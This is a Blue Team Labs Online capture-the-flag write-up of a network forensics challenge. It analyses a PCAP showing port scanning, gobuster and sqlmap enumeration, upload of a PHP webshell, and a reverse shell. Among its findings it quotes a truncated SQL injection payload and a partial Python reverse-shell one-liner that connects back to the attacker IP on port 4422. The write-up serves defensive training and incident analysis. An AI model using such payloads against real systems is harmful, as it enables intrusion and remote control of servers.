# 🕵️‍♂️ BTLO Challenge – Network Analysis: Web Shell

🔗 **Challenge link:** [Blueteam Labs Online](https://blueteamlabs.online/home/challenge/network-analysis-web-shell-d4d3a2821b)  
📂 **Category:** Network Analysis  
🗂️ **File analyzed:** `webshell.pcap`

---

## 🎯 Objective
Analyze the PCAP file to investigate malicious activity, identify attacker behavior, and detect if a reverse shell was established.

---

## 📝 Findings

| Category              | Observation |
|------------------------|-------------|
| **Attacker IP**        | `10.251.96.4` |
| **Victim IP**          | `10.251.96.5` |
| **Scanning method**    | TCP SYN Scan |
| **Enumeration tools**  | `gobuster 3.0.1`, `sqlmap 1.4.7` |
| **Uploaded webshell**  | `dbfunctions.php` |
| **Webshell parameter** | `cmd` |
| **First command**      | `id` |
| **Reverse shell**      | Port `4422` connected back to attacker |
| **Payload used**       | Python reverse shell |

---

## 🔍 Analysis Steps

1. **Port Scanning**  
   - Observed SYN packets to multiple ports.  
   - Only port **22 (SSH)** was open, others returned RST.  

2. **Web Enumeration**  
   - Detected traffic from `gobuster/3.0.1`.  
   - Discovered hidden pages: `/login.php`, `/browse.php`, etc.  

3. **SQL Injection Attempts**  
   - Example payload:  
     ```
     /?QLuT=8454 AND 1=1 UNION ALL SELECT ...
     ```
   - Detected use of **sqlmap** for automation.  

4. **Web Shell Upload**  
   - File uploaded: `dbfunctions.php`  
   - Parameter: `cmd` allowed system command execution.  

5. **Reverse Shell Execution**  
   - Payload executed:  
     ```python
     python -c 'import socket,subprocess,os; s=socket.socket(...); s.connect(("10.251.96.4",4422)); ...'
     ```
   - Attacker gained interactive shell (`/bin/sh -i`).  

---

## 🛡️ Lessons Learned

- Always monitor **unusual ports** (e.g., `4422`) for reverse shells.  
- Web servers must sanitize inputs to prevent **SQL injection**.  
- Uploaded files should be restricted to avoid **webshells**.  
- Network monitoring tools (Wireshark, Suricata, Zeek) are essential in detecting these attacks.  

---

## 🧰 Skills Demonstrated

- Network forensic analysis with **Wireshark**  
- Detecting **port scans** and **enumeration tools**  
- Identifying **SQL injection attempts**  
- Investigating **webshell traffic**  
- Detecting **reverse shells**  
- Writing structured **incident reports**

---

✍️ **Author:** [Your Name]  
🔗 **Portfolio:** [github.com/yourusername](https://github.com/yourusername)

